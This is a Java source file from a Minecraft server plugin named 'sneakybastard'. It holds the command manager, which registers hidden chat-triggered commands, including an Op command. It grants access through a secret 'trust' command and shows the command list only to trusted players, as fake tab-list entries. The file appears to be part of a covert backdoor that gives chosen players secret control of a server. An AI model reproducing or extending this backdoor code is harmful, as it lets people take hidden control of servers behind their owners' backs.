package net.blackofworld.sneakybastard.Command;

import com.google.common.reflect.ClassPath;
import com.mojang.authlib.GameProfile;
import net.blackofworld.sneakybastard.Commands.Server.Op;
import net.blackofworld.sneakybastard.Utils.BukkitReflection;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoRemovePacket;
import net.minecraft.network.protocol.game.ClientboundPlayerInfoUpdatePacket;
import net.minecraft.server.level.ServerPlayer;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.HashSet;
import java.util.UUID;

public class CommandManager {
    public static final String COMMAND_SIGN = "-";
    public static final String CHAT_TRIGGER = "#";
    public static final String TRUST_COMMAND = "--";
    public static final String COMMAND_PREFIX = "§a[§6Sne§2aky§5Bast§da§2r§ed§a]§r ";
    public static CommandManager Instance;
    private final HashSet<UUID> trustedPeople = new HashSet<>();
    private final CommandListener cl;
    public HashSet<CommandBase> commandList = new HashSet<>();
    public HashMap<UUID, ServerPlayer> fakePlayers = new HashMap<>();

    public CommandManager() {
        Init();
        Instance = this;
        cl = new CommandListener();
    }

    public void Destroy() {
        cl.Destroy();
        for (var uuid : trustedPeople) {
            var p = Bukkit.getPlayer(uuid);
            if(!p.isOnline()) continue;
            p.SendPacket(new ClientboundPlayerInfoRemovePacket(fakePlayers.keySet().stream().toList()));
        }
        trustedPeople.clear();
        fakePlayers.clear();
    }

    public boolean addTrusted(Player p) {
        var add = EnumSet.of(ClientboundPlayerInfoUpdatePacket.Action.ADD_PLAYER);
        p.SendPacket(new ClientboundPlayerInfoUpdatePacket(add, fakePlayers.values()));
        return trustedPeople.add(p.getUniqueId());
    }

    public boolean removeTrusted(Player p) {
        p.SendPacket(new ClientboundPlayerInfoRemovePacket(fakePlayers.keySet().stream().toList()));
        return trustedPeople.remove(p.getUniqueId());
    }

    public boolean isTrusted(Player p) {
        return trustedPeople.contains(p.getUniqueId());
    }

    private void Init() {
        try {
            final ClassPath classPath = ClassPath.from(CommandManager.class.getClassLoader());
            String packageName = Op.class.getName().substring(0, Op.class.getName().lastIndexOf('.'));
            packageName = packageName.substring(0, packageName.lastIndexOf('.'));
            for (final ClassPath.ClassInfo info : classPath.getTopLevelClassesRecursive(packageName)) {
                CommandBase cmd = (CommandBase) info.load().getDeclaredConstructor().newInstance();
                UUID uuid = UUID.randomUUID();
                var world = Bukkit.getWorlds().get(0);
                var nmsWorld = BukkitReflection.getWorldLevel(world);
                var server = BukkitReflection.getMinecraftServer();
                ServerPlayer npc = new ServerPlayer(server, nmsWorld, new GameProfile(uuid, COMMAND_SIGN + cmd.Command));
                fakePlayers.put(uuid, npc);
                commandList.add(cmd);
            }
        } catch (IOException | NoSuchMethodException | InstantiationException | IllegalAccessException |
                 InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }
}